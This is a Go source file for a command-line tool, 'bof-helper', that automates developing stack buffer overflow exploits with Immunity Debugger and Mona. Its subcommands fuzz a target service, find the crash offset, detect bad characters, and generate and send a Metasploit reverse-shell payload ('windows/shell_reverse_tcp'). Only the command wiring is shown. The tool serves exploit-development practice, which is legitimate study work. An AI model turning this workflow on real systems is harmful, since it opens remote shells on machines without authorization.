package main

import (
	"fmt"
	"log"
	"os"

	"github.com/urfave/cli/v2"
)

func main() {
	configName := "bof-config.json"
	app := &cli.App{
		Name:                 "bof-helper",
		Usage:                "Makes developing buffer overflows with Immunity Debugger and Mona slightly more convenient.",
		EnableBashCompletion: true,
		Commands: []*cli.Command{
			{
				Name:  "set",
				Usage: "saves ip, port, command and metasploit path to config file.",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:     "ip",
						Aliases:  []string{"i"},
						Usage:    "Immunity Debugger host `IP`",
						Required: true,
					},
					&cli.IntFlag{
						Name:     "port",
						Aliases:  []string{"p"},
						Usage:    "Immunity Debugger app  `PORT`",
						Required: true,
					},
					&cli.IntFlag{
						Name:    "timeout",
						Aliases: []string{"t"},
						Usage:   "Connection timeout",
						Value:   5,
					},
					&cli.StringFlag{
						Name:    "cmd",
						Aliases: []string{"c"},
						Value:   "",
						Usage:   "Vulnerable app command",
					},
					&cli.StringFlag{
						Name:    "msfpath",
						Aliases: []string{"m"},
						Value:   "/usr/share/metasploit-framework",
						Usage:   "metasploit framework path",
					},
				},
				Action: func(c *cli.Context) error {
					conf := Config{Host: c.String("ip"), Port: c.Int("port"), Cmd: c.String("cmd"), MsfPath: c.String("msfpath"), Timeout: c.Int("timeout")}
					saveConfig(conf, configName)
					return nil
				},
			},

			{
				Name:  "fuzz",
				Usage: "sends increasingly long buffer until server stops responding",
				Flags: []cli.Flag{
					&cli.IntFlag{
						Name:    "time",
						Aliases: []string{"t"},
						Usage:   "Time between requests in seconds",
						Value:   1,
					},
				},
				Action: func(c *cli.Context) error {
					conf, err := loadConfig(configName)
					if err != nil {
						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
						log.Fatal(err)
					}
					size := fuzz(conf.(Config), c.Int("time"))
					fmt.Println("Application crashed at buffer size", size)
					return nil
				},
			},

			{
				Name:  "offset",
				Usage: "sends metasploit generated pattern to detect offset",
				Flags: []cli.Flag{
					&cli.IntFlag{
						Name:     "length",
						Aliases:  []string{"l"},
						Usage:    "Buffersize that crashed app while fuzzing",
						Required: true,
					},
					&cli.BoolFlag{
						Name:    "verify",
						Aliases: []string{"v"},
						Usage:   "set if you want to verify found offset",
					},
				},
				Action: func(c *cli.Context) error {
					conf, err := loadConfig(configName)
					if err != nil {
						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
						log.Fatal(err)
					}
					offset(conf.(Config), c.Int("length"), c.Bool("verify"))
					return nil
				},
			},

			{
				Name:  "badchars",
				Usage: "sends payload to detect badchars",
				Flags: []cli.Flag{
					&cli.IntFlag{
						Name:     "offset",
						Aliases:  []string{"o"},
						Usage:    "previously detected offset",
						Required: true,
					},
					&cli.StringFlag{
						Name:    "bad",
						Aliases: []string{"b"},
						Usage:   "detected `\"BADCHARS\"`",
					},
					&cli.BoolFlag{
						Name:    "recurse",
						Aliases: []string{"r"},
						Usage:   "set if you want to run until all badchars have been detected",
					},
				},
				Action: func(c *cli.Context) error {
					conf, err := loadConfig(configName)
					if err != nil {
						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
						log.Fatal(err)
					}
					badchars(conf.(Config), c.Int("offset"), c.String("bad"), c.Bool("recurse"))
					return nil
				},
			},
			{
				Name:  "generate",
				Usage: "generates buffer overflow payload",
				Flags: []cli.Flag{
					&cli.IntFlag{
						Name:     "offset",
						Aliases:  []string{"o"},
						Usage:    "previously detected offset",
						Required: true,
					},
					&cli.StringFlag{
						Name:     "jmp",
						Aliases:  []string{"j"},
						Usage:    "jump point identified with mona",
						Required: true,
					},
					&cli.StringFlag{
						Name:     "badchars",
						Aliases:  []string{"b"},
						Usage:    "detected badchars",
						Required: true,
					},
					&cli.StringFlag{
						Name:    "payload-type",
						Aliases: []string{"pt"},
						Value:   "windows/shell_reverse_tcp",
						Usage:   "mfsvenom payload type to use",
					},
					&cli.StringFlag{
						Name:     "ip",
						Aliases:  []string{"i"},
						Usage:    "local ip for reverse shell",
						Required: true,
					},
					&cli.IntFlag{
						Name:     "port",
						Aliases:  []string{"p"},
						Usage:    "local port for reverse shell",
						Required: true,
					},
					&cli.BoolFlag{
						Name:    "send",
						Aliases: []string{"s"},
						Usage:   "set to send payload after generating",
					},
				},
				Action: func(c *cli.Context) error {
					conf, err := loadConfig(configName)
					if err != nil {
						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
						log.Fatal(err)
					}
					generate(conf.(Config), c.Int("offset"), c.String("jmp"), c.String("badchars"), c.String("payload-type"), c.Bool("send"), c.String("ip"), c.Int("port"))
					return nil
				},
			},

			{
				Name:  "execute",
				Usage: "executes generated payload",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:     "file",
						Aliases:  []string{"f"},
						Usage:    "generated payload `FILE` to execute",
						Required: true,
					},
				},
				Action: func(c *cli.Context) error {
					conf, err := loadConfig(configName)
					if err != nil {
						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
						log.Fatal(err)
					}
					e, err := loadConfig(c.String("file"))
					if err != nil {
						log.Fatal(err)
					}
					execute(conf.(Config), e.(Exploit))
					return nil
				},
			},
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}

}
